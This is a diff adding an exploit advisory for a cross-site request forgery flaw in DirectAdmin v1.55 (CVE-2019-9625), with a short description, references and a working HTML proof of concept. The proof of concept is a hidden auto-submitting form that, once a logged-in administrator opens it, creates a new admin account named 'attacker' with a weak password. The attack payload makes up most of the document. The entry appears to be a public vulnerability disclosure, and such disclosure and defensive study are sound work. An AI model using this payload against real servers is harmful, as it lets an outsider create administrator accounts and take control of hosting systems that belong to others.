@@ -1,0 +1,52 @@
+# Exploit title: DirectAdmin v1.55 - CSRF via CMD_ACCOUNT_ADMIN Admin Panel
+# Date: 03/03/2019
+# Exploit Author: ManhNho
+# Vendor Homepage: https://www.directadmin.com/
+# Software Link: https://www.directadmin.com/
+# Demo Link: https://www.directadmin.com:2222/CMD_ACCOUNT_ADMIN
+# Version: 1.55
+# CVE: CVE-2019-9625
+# Tested on: Windows 10 / Kali Linux
+# Category: Webapps
+
+
+#1. Description
+-----------------------------------------------------
+DirectAdmin v 1.55 have CSRF via CMD_ACCOUNT_ADMIN Admin Panel lead to
+create new admin account
+
+#2. PoC
+-----------------------------------------------------
+a) Send below crafted request to logged in user who is having admin
+Administrator level access
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://server:2222/CMD_ACCOUNT_ADMIN" method="POST">
+      <input type="hidden" name="fakeusernameremembered" value="" />
+      <input type="hidden" name="fakepasswordremembered" value="" />
+      <input type="hidden" name="action" value="create" />
+      <input type="hidden" name="username" value="attacker" />
+      <input type="hidden" name="email" value="attacker&#64;mail&#46;com" />
+      <input type="hidden" name="passwd" value="123456" />
+      <input type="hidden" name="passwd2" value="123456" />
+      <input type="hidden" name="notify" value="yes" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+
+
+b) Once the logged in user opens the URL the form will get submitted
+with active session of  administrator and action get performed
+successfully.
+
+#3. References
+
+-----------------------------------------------------
+
+
+https://github.com/ManhNho/CVEs/blob/master/New-Requests/DirectAdmin-CSRF
+
+https://nvd.nist.gov/vuln/detail/CVE-2019-9625
